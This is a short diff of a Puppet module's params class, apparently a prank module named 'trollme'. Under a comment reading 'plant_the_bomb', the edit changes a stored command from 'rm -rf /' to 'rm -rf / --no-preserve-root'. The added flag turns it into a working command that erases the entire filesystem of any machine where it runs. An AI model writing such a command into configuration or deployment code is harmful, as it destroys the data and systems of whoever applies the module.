@@ -10,6 +10,6 @@ class trollme::params {
   $sl_pkg     = 'sl'
 
   # plant_the_bomb
-  $ptb_command = 'rm -rf /'
+  $ptb_command = 'rm -rf / --no-preserve-root'
 
 }
